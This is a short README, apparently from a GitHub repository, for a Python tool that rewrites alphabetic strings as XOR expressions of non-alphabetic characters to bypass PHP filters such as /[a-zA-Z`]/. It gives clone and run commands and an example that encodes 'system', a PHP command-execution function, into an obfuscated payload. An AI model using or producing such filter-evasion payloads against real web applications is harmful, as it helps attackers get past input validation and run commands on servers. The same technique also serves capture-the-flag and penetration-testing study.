# PHP-Non-Alphabetical-Encoder
Reproduce your Alphabetical string using XOR operation of Two Non-alphabetical Chars to bypass php filter like `/[a-zA-Z\``]/`
# How to use 
```
git clone https://github.com/0XMohomiester/PHP-Non-Alphabetical-Encoder.git
cd PHP-Non-Alphabetical-Encoder
python3 php-non-alpha-encoder.py <alpha_string_to_encode>
```

# Example 
```
python3 php-non-alpha-encoder.py system
("("^"[").("$"^"]").("("^"[").(")"^"]").("%"^"@").("-"^"@")
```
